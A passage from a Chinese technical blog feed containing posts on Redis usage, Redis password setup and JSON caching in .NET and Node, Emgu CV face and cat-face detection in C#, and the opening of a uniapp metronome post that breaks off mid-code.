restart redis</span><br></pre></td></tr></table></figure><h1 id="程序测试redis"><a href="#程序测试redis" class="headerlink" title="程序测试redis"></a>程序测试redis</h1><p>.NET</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Redis 服务器地址和端口</span></span><br><span class="line"><span class="built_in">string</span> redisConnectionString = <span class="string">&quot;199.24x.x.x:6379&quot;</span>; <span class="comment">// 默认 Redis 端口是 6379</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接到 Redis 的实例</span></span><br><span class="line">ConnectionMultiplexer redis = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    redis = ConnectionMultiplexer.Connect(redisConnectionString);</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;连接成功!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception ex)</span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(<span class="string">$&quot;连接到 Redis 失败: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Redis 数据库实例</span></span><br><span class="line">IDatabase db = redis.GetDatabase();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入数据</span></span><br><span class="line"><span class="built_in">string</span> key = <span class="string">&quot;myKey22&quot;</span>;</span><br><span class="line"><span class="built_in">string</span> <span class="keyword">value</span> = <span class="string">&quot;Hello, Redis!&quot;</span>;</span><br><span class="line">db.StringSet(key, <span class="keyword">value</span>);</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;已写入: <span class="subst">&#123;key&#125;</span> - <span class="subst">&#123;<span class="keyword">value</span>&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取数据</span></span><br><span class="line"><span class="built_in">string</span> retrievedValue = db.StringGet(key);</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;读取到: <span class="subst">&#123;key&#125;</span> - <span class="subst">&#123;retrievedValue&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除数据</span></span><br><span class="line">db.KeyDelete(key);</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;已删除: <span class="subst">&#123;key&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line">redis.Close();</span><br><span class="line">Console.WriteLine(<span class="string">&quot;连接关闭&quot;</span>);</span><br></pre></td></tr></table></figure><p>node</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i redis</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> redis = <span class="built_in">require</span>(<span class="string">&#x27;redis&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Redis客户端连接</span></span><br><span class="line"><span class="keyword">const</span> client = redis.<span class="title function_">createClient</span>(&#123;</span><br><span class="line">    <span class="attr">host</span>: <span class="string">&#x27;199.24x.x.x&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">6379</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听连接事件，当成功连接到Redis时执行回调函数</span></span><br><span class="line">client.<span class="title function_">on</span>(<span class="string">&#x27;connect&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;成功连接到Redis服务器&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听错误事件，当出现错误时执行回调函数</span></span><br><span class="line">client.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;连接Redis服务器时出现错误：&#x27;</span>, err);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置一个键值对</span></span><br><span class="line">client.<span class="title function_">set</span>(<span class="string">&#x27;myKey&#x27;</span>, <span class="string">&#x27;myValue&#x27;</span>, <span class="function">(<span class="params">err, reply</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;设置键值对时出现错误：&#x27;</span>, err);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;设置键值对成功，回复：&#x27;</span>, reply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取键值对</span></span><br><span class="line">client.<span class="title function_">get</span>(<span class="string">&#x27;myKey&#x27;</span>, <span class="function">(<span class="params">err, value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;获取键值对时出现错误：&#x27;</span>, err);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;获取到的键值对的值为：&#x27;</span>, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除键值对</span></span><br><span class="line">client.<span class="title function_">del</span>(<span class="string">&#x27;myKey&#x27;</span>, <span class="function">(<span class="params">err, reply</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;删除键值对时出现错误：&#x27;</span>, err);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;删除键值对成功，回复：&#x27;</span>, reply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭Redis客户端连接</span></span><br><span class="line">client.<span class="title function_">quit</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><h1 id="redis设置密码"><a href="#redis设置密码" class="headerlink" title="redis设置密码"></a>redis设置密码</h1><h2 id="1-编辑-Redis-配置文件"><a href="#1-编辑-Redis-配置文件" class="headerlink" title="1. 编辑 Redis 配置文件"></a>1. 编辑 Redis 配置文件</h2><p>Redis 的配置文件通常位于 &#x2F;etc&#x2F;redis&#x2F;redis.conf 或 &#x2F;etc&#x2F;redis.conf。用你喜欢的文本编辑器打开它，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/redis/redis.conf</span><br></pre></td></tr></table></figure><h2 id="2-找到并修改-requirepass-参数"><a href="#2-找到并修改-requirepass-参数" class="headerlink" title="2. 找到并修改 requirepass 参数"></a>2. 找到并修改 requirepass 参数</h2><p>在配置文件中找到以下行（可能被注释掉）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># requirepass foobared</span></span><br></pre></td></tr></table></figure><p>将其取消注释并替换为你的密码，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass your_secure_password</span><br></pre></td></tr></table></figure><h2 id="3-重启-Redis-服务"><a href="#3-重启-Redis-服务" class="headerlink" title="3. 重启 Redis 服务"></a>3. 重启 Redis 服务</h2><p>保存并退出文件后，重启 Redis 服务以应用更改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart redis</span><br></pre></td></tr></table></figure><h2 id="4-测试密码功能"><a href="#4-测试密码功能" class="headerlink" title="4. 测试密码功能"></a>4. 测试密码功能</h2><p>你可以通过以下命令测试 Redis 是否需要密码：</p><p>使用 redis-cli 连接<br>尝试未输入密码的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br><span class="line">&gt; get key</span><br></pre></td></tr></table></figure><p>如果设置了密码，Redis 会返回类似如下的错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(error) NOAUTH Authentication required.</span><br></pre></td></tr></table></figure><p>使用 AUTH 命令验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br><span class="line">&gt; auth your_secure_password</span><br><span class="line">OK</span><br><span class="line">&gt; get key</span><br></pre></td></tr></table></figure><p>如果密码正确，后续操作将生效。</p><h2 id="5-链接修改"><a href="#5-链接修改" class="headerlink" title="5. 链接修改"></a>5. 链接修改</h2><p>199.x.x.xxx:6379,password&#x3D;123X.zx  更改redis链接 </p><!--            private readonly int isRedis= ConfigManager.TempI115;  string tkuid = isRedis==1? _jwt.GetTokenFromRedis(token): _jwt.GetUid(_jwt.JwtDecrypt(token)) ; --><h1 id="redis缓存json-RedisHelper"><a href="#redis缓存json-RedisHelper" class="headerlink" title="redis缓存json RedisHelper"></a>redis缓存json RedisHelper</h1><p>方法添加 Redis 缓存，可以通过以下方式扩展代码：</p><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>定义 Redis 缓存逻辑：</p><p>先尝试从 Redis 缓存中读取数据。<br>如果缓存命中，则直接返回数据。<br>如果缓存未命中，则查询数据库，处理数据后存入 Redis，并设置适当的过期时间。<br>定义 Redis 键：</p><p>使用一个唯一键，例如 **CityInfoList:{id}**，确保缓存区分不同 id 的数据。<br>序列化和反序列化：</p><p>使用 JSON 格式存储数据，方便跨语言和跨系统的兼容性。<br>扩展后的代码<br>以下是添加 Redis 缓存后的完整实现：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;CityInfoS&gt; <span class="title">FindIMCityInfoListByPIDS</span>(<span class="params"><span class="built_in">string</span> id</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 定义 Redis 缓存键</span></span><br><span class="line">    <span class="built_in">string</span> redisKey = <span class="string">$&quot;IMCityInfoList:<span class="subst">&#123;id&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试从 Redis 获取数据</span></span><br><span class="line">    <span class="built_in">string</span> cachedData = RedisHelper.GetString(redisKey); <span class="comment">// RedisHelper 是 Redis 操作工具类</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrEmpty(cachedData))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果缓存命中，反序列化并返回数据</span></span><br><span class="line">        <span class="keyword">return</span> JsonConvert.DeserializeObject&lt;List&lt;IMCityInfoS&gt;&gt;(cachedData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 缓存未命中，从数据库查询</span></span><br><span class="line">    <span class="built_in">string</span> sql = <span class="string">@&quot;SELECT `CtId`, `Pid`, `PidS`, `CityCode`, `CityName`, </span></span><br><span class="line"><span class="string">                          `PostCode`, `AreaCode`, `Ctime`, `CtimeInt`, `LangType`, `HasSon`</span></span><br><span class="line"><span class="string">                   FROM `IMCityInfoS` </span></span><br><span class="line"><span class="string">                   WHERE PID = @PID&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> parameters = <span class="keyword">new</span> MySqlParameter[] &#123; <span class="keyword">new</span> MySqlParameter(<span class="string">&quot;@PID&quot;</span>, id) &#125;;</span><br><span class="line"></span><br><span class="line">    DataSet ds = DbHelperMySQL.Query(sql, parameters);</span><br><span class="line">    <span class="keyword">if</span> (ds != <span class="literal">null</span> &amp;&amp; ds.Tables[<span class="number">0</span>].Rows.Count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 转换查询结果为 JSON</span></span><br><span class="line">        <span class="built_in">string</span> json = JsonConvert.SerializeObject(ds.Tables[<span class="number">0</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置缓存并指定过期时间（例如30分钟）</span></span><br><span class="line">        RedisHelper.SetString(redisKey, json, TimeSpan.FromMinutes(<span class="number">30</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化为对象列表并返回</span></span><br><span class="line">        <span class="keyword">return</span> JsonConvert.DeserializeObject&lt;List&lt;IMCityInfoS&gt;&gt;(json);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果查询无结果，返回空</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RedisHelper-工具类"><a href="#RedisHelper-工具类" class="headerlink" title="RedisHelper 工具类"></a>RedisHelper 工具类</h2><p>如果你尚未实现 RedisHelper，可以参考以下示例代码：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> StackExchange.Redis;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">RedisHelper</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> ConnectionMultiplexer redis = ConnectionMultiplexer.Connect(<span class="string">&quot;localhost&quot;</span>); <span class="comment">// 替换为你的 Redis 地址</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> IDatabase db = redis.GetDatabase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取字符串数据</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">GetString</span>(<span class="params"><span class="built_in">string</span> key</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> db.StringGet(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置字符串数据并指定过期时间</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SetString</span>(<span class="params"><span class="built_in">string</span> key, <span class="built_in">string</span> <span class="keyword">value</span>, TimeSpan? expiry = <span class="literal">null</span></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        db.StringSet(key, <span class="keyword">value</span>, expiry);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h2><p>Redis 连接池：实际生产中，建议使用 Redis 连接池来管理连接，避免连接过多导致资源占用。<br>异常处理：在 Redis 读写操作中，添加异常捕获逻辑，确保即使 Redis 出现问题，也不会影响数据库查询。<br>过期时间：根据业务需求设置合理的过期时间，避免缓存数据过期或无效。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Redis-JWT&quot;&gt;&lt;a href=&quot;#Redis-JWT&quot; class=&quot;headerlink&quot; title=&quot;Redis JWT&quot;&gt;&lt;/a&gt;Redis JWT&lt;/h1&gt;&lt;p&gt;在 .NET 中使用 Redis 来存储 JWT（JSON Web Token）可以</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="jwt" scheme="https://banjinmei.github.io/tags/jwt/"/>
    
    <category term="token" scheme="https://banjinmei.github.io/tags/token/"/>
    
    <category term="redis" scheme="https://banjinmei.github.io/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>cashrp opencv</title>
    <link href="https://banjinmei.github.io/2024/12/03/cashrp-opencv/"/>
    <id>https://banjinmei.github.io/2024/12/03/cashrp-opencv/</id>
    <published>2024-12-02T17:15:38.000Z</published>
    <updated>2024-12-02T17:17:14.106Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Emgu-CV进行基本的人脸检测。"><a href="#Emgu-CV进行基本的人脸检测。" class="headerlink" title="Emgu CV进行基本的人脸检测。"></a>Emgu CV进行基本的人脸检测。</h1><p>人脸检测是指定位图像中的人脸位置，而人脸识别是指确认或验证这些脸孔的身份。为了实现人脸识别，需要训练一个模型，或者使用预训练的模型。</p><h1 id="安装-Emgu-CV"><a href="#安装-Emgu-CV" class="headerlink" title="安装 Emgu CV"></a>安装 Emgu CV</h1><p>首先，需要通过NuGet安装Emgu CV包。可以通过Visual Studio的NuGet包管理器来安装：</p><p>打开的C#项目。<br>右键点击解决方案资源管理器中的项目名称，选择“管理NuGet程序包”。</p><h2 id="搜索并安装Emgu-CV和Emgu-CV-runtime-windows。"><a href="#搜索并安装Emgu-CV和Emgu-CV-runtime-windows。" class="headerlink" title="搜索并安装Emgu.CV和Emgu.CV.runtime.windows。"></a>搜索并安装Emgu.CV和Emgu.CV.runtime.windows。</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载人脸检测分类器</span></span><br><span class="line">CascadeClassifier faceCascade = <span class="keyword">new</span> CascadeClassifier(<span class="string">&quot;haarcascade_frontalface_default.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取输入图像</span></span><br><span class="line">Image&lt;Bgr, <span class="built_in">byte</span>&gt; inputImage = <span class="keyword">new</span> Image&lt;Bgr, <span class="built_in">byte</span>&gt;(<span class="string">&quot;face.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换为灰度图像，因为人脸检测通常在灰度图像上进行</span></span><br><span class="line">Image&lt;Gray, <span class="built_in">byte</span>&gt; grayImage = inputImage.Convert&lt;Gray, <span class="built_in">byte</span>&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行人脸检测</span></span><br><span class="line">Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, <span class="number">1.1</span>, <span class="number">3</span>, Size.Empty);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在检测到的人脸周围绘制矩形框</span></span><br><span class="line"><span class="keyword">foreach</span> (Rectangle face <span class="keyword">in</span> faces)</span><br><span class="line">&#123;</span><br><span class="line">    inputImage.Draw(face, <span class="keyword">new</span> Bgr(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>), <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存标记后的图像为output.jpg</span></span><br><span class="line">inputImage.Save(<span class="string">&quot;output.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Console.WriteLine(<span class="string">&quot;save~output.jpg&quot;</span>);</span><br></pre></td></tr></table></figure><p>xml来自 <a class="link"   href="https://github.com/opencv/opencv/tree/master/data/haarcascades" >https://github.com/opencv/opencv/tree/master/data/haarcascades<i class="fas fa-external-link-alt"></i></a></p><h2 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h2><p>如果没有 Emgu.CV.runtime.windows  则会加载不了xml</p><p>Exception ：System.TypeInitializationException:“The type initializer for ‘Emgu.CV.CvInvoke’ threw an exception.”</p><p>检查运行时依赖 (opencv_world*.dll) 是否加载正确。<br>安装最新的 VC++ Redistributable。<br>确保项目目标平台与 Emgu.CV 的依赖项一致。</p><h1 id="识别猫脸"><a href="#识别猫脸" class="headerlink" title="识别猫脸"></a>识别猫脸</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载检测分类器</span></span><br><span class="line">CascadeClassifier faceCascade = <span class="keyword">new</span> CascadeClassifier(<span class="string">&quot;haarcascade_frontalcatface.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取输入图像</span></span><br><span class="line">Image&lt;Bgr, <span class="built_in">byte</span>&gt; inputImage = <span class="keyword">new</span> Image&lt;Bgr, <span class="built_in">byte</span>&gt;(<span class="string">&quot;cat2.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换为灰度图像，因为人脸检测通常在灰度图像上进行</span></span><br><span class="line">Image&lt;Gray, <span class="built_in">byte</span>&gt; grayImage = inputImage.Convert&lt;Gray, <span class="built_in">byte</span>&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行人脸检测</span></span><br><span class="line">Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, <span class="number">1.1</span>, <span class="number">3</span>, Size.Empty);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在检测到的人脸周围绘制矩形框</span></span><br><span class="line"><span class="keyword">foreach</span> (Rectangle face <span class="keyword">in</span> faces)</span><br><span class="line">&#123;</span><br><span class="line">    inputImage.Draw(face, <span class="keyword">new</span> Bgr(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>), <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存标记后的图像为output.jpg</span></span><br><span class="line">inputImage.Save(<span class="string">&quot;output.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">Console.WriteLine(<span class="string">&quot;save~output.jpg&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Emgu-CV进行基本的人脸检测。&quot;&gt;&lt;a href=&quot;#Emgu-CV进行基本的人脸检测。&quot; class=&quot;headerlink&quot; title=&quot;Emgu CV进行基本的人脸检测。&quot;&gt;&lt;/a&gt;Emgu CV进行基本的人脸检测。&lt;/h1&gt;&lt;p&gt;人脸检测是指定位图像</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term=".net" scheme="https://banjinmei.github.io/tags/net/"/>
    
    <category term="csharp" scheme="https://banjinmei.github.io/tags/csharp/"/>
    
    <category term="opencv" scheme="https://banjinmei.github.io/tags/opencv/"/>
    
    <category term="emgu" scheme="https://banjinmei.github.io/tags/emgu/"/>
    
  </entry>
  
  <entry>
    <title>uniapp 节拍器</title>
    <link href="https://banjinmei.github.io/2024/12/03/uniapp-%E8%8A%82%E6%8B%8D%E5%99%A8/"/>
    <id>https://banjinmei.github.io/2024/12/03/uniapp-%E8%8A%82%E6%8B%8D%E5%99%A8/</id>
    <published>2024-12-02T17:12:19.000Z</published>
    <updated>2024-12-02T17:15:14.529Z</updated>
    
    <content type="html"><![CDATA[<h1 id="节拍器基础功能"><a href="#节拍器基础功能" class="headerlink" title="节拍器基础功能"></a>节拍器基础功能</h1><p>加速 前速 启动 暂停</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span 